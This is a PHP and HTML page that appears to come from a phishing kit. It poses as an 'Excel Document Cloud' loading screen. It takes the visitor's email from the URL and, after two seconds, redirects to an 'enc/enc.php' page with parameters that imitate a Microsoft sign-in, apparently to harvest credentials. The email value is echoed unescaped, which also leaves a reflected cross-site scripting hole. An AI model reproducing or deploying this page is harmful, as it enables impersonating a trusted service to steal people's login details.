<?php

$email = $_GET['email'];
echo "<meta http-equiv=refresh content=2;url='enc/enc.php?email=$email&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";

?>




<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<title>Excel Document Cloud</title>
</head>
<body style="background-color: #339966; ">

<div class="loading">
<h3 style="text-align: center; margin-bottom: 40px;"> <font size="8" color="#ffffff" face="tahoma">Excel Document Cloud<br><br>
<font size="4" color="#000000" face="tahoma"><img src="ik/d60da137-271e-492a-b2f8-98d8de6bcc2b.png" width="256" height="200">

<h3 style="text-align: center; margin-bottom: 40px;"> <font size="4" color="#ffffff" face="tahoma">Loading Document
<p>Please Wait...</p>

<p><img src="ik/4.gif"></p></font></h3><font size="4" color="#ffffff" face="tahoma">
 
	
</font></font></font></h3></div><font size="8" color="#ffffff" face="tahoma"><font size="4" color="#000000" face="tahoma"><font size="4" color="#ffffff" face="tahoma">
</font></font></font>
<p style="text-align: center; font-size: 16px; color: #656565; width: 366px; height: 61px; margin-top: 40px">
</p>







</body></html>